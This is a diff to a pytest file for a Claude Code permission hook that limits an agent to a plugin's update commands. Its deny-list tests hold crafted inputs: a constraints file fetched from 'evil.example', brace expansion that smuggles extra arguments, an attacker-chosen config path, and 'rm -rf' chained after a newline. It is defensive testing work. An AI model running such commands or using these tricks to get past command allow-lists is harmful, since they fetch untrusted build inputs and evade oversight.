@@ -78,7 +78,7 @@ def denied(out: str) -> str:
     hso = json.loads(out)["hookSpecificOutput"]
     assert hso["permissionDecision"] == "deny", hso
     reason: str = hso["permissionDecisionReason"]
-    assert "E-VER-01" in reason and "only these commands run" in reason, reason
+    assert "E-VER-01" in reason and "only the update commands run" in reason, reason
     return reason
 
 
@@ -96,9 +96,9 @@ def test_update_commands_run_while_versions_differ(
         f"cd {clone.as_posix()} && git pull --ff-only",
         f"cd {clone.as_posix()} && git checkout main",
         f"cd {clone.as_posix()} && {INSTALL}",
-        f'cd "{clone.as_posix()}" && TSL_ORG_FILE=deploy/render/org.toml {INSTALL}',
-        f"cd {clone.as_posix()} && uv tool install --python 3.12 --reinstall --no-cache"
-        " --constraints c.txt ./tsl",
+        f'cd "{clone.as_posix()}" && TSL_ORG_FILE=deploy/render/tsl-org.github.toml {INSTALL}',
+        f"cd {clone.as_posix()} && TSL_ORG_FILE={clone.as_posix()}/deploy/render/tsl-org.github.toml"
+        f" {INSTALL}",
     ):
         out, exits = hook(command, companion, home, root)
         assert out == "", (command, out)
@@ -131,6 +131,18 @@ def test_everything_else_stays_denied(companion: Path, home: Path, tmp_path: Pat
         f"cd {clone} && {INSTALL} | tee x",
         f"cd {clone} && {INSTALL}\nrm -rf runs",
         f"cd {clone} && TSL_ORG_FILE=$HOME/org.toml {INSTALL}",
+        # The agent picks neither the build inputs nor the sign-in and service settings:
+        f"cd {clone} && TSL_ORG_FILE=/tmp/evil.toml {INSTALL}",
+        f"cd {clone} && TSL_ORG_FILE=deploy/render/other.toml {INSTALL}",
+        f"cd {clone} && uv tool install --python 3.12 --reinstall --no-cache --constraints c.txt"
+        " ./tsl",
+        f"cd {clone} && uv tool install --python 3.12 --reinstall --no-cache --constraints"
+        " https://evil.example/c.txt ./tsl",
+        # Brace expansion would add arguments: {c.txt,--index-url=...} becomes two.
+        f"cd {clone} && TSL_ORG_FILE={{deploy/render/tsl-org.github.toml,x}} {INSTALL}",
+        f"cd {{{clone},x}} && git pull",
+        f"cd {clone} && uv tool install --python 3.12 --reinstall --no-cache ./ts?",
+        f'cd "{clone}\\" && git pull',
         f"cd {clone} && uv tool install --python 3.12 --reinstall --no-cache ../evil/tsl",
         f"cd {clone} && git pull origin evil-branch",
         "claude plugin update truminds@another-marketplace",
@@ -194,3 +206,36 @@ def test_git_bash_drive_paths_name_the_clone(companion: Path, home: Path, tmp_pa
     bash = "/" + clone.drive[0].lower() + clone.as_posix()[2:]
     out, _ = hook(f"cd {bash} && git pull", companion, home, root)
     assert out == "", bash
+
+
+def test_the_hint_without_a_clone_says_to_use_a_terminal(
+    companion: Path, home: Path, tmp_path: Path
+) -> None:
+    root = make_plugin(tmp_path, in_clone=False)
+    reason = denied(hook("ls", companion, home, root)[0])
+    assert "terminal outside Claude Code" in reason and "claude plugin update" in reason
+
+
+def test_a_quoted_clone_path_keeps_its_spaces(companion: Path, home: Path, tmp_path: Path) -> None:
+    root = make_plugin(tmp_path / "My  Clones")
+    clone = root.parent.parent.as_posix()
+    assert hook(f'cd "{clone}" && git pull', companion, home, root)[0] == ""
+    other = tmp_path / "My Clones" / "AI-Skill-Library"  # one space: another folder
+    denied(hook(f'cd "{other.as_posix()}" && git pull', companion, home, root)[0])
+
+
+def test_a_home_relative_clone_path(
+    companion: Path, home: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    root = make_plugin(tmp_path)
+    monkeypatch.setenv("HOME", str(tmp_path))
+    monkeypatch.setenv("USERPROFILE", str(tmp_path))
+    assert hook("cd ~/AI-Skill-Library && git pull", companion, home, root)[0] == ""
+
+
+@pytest.mark.skipif(os.name != "nt", reason="Windows paths")
+def test_a_quoted_windows_path(companion: Path, home: Path, tmp_path: Path) -> None:
+    root = make_plugin(tmp_path)
+    clone = str(root.parent.parent.resolve())
+    assert "\\" in clone
+    assert hook(f'cd "{clone}" && git pull', companion, home, root)[0] == ""
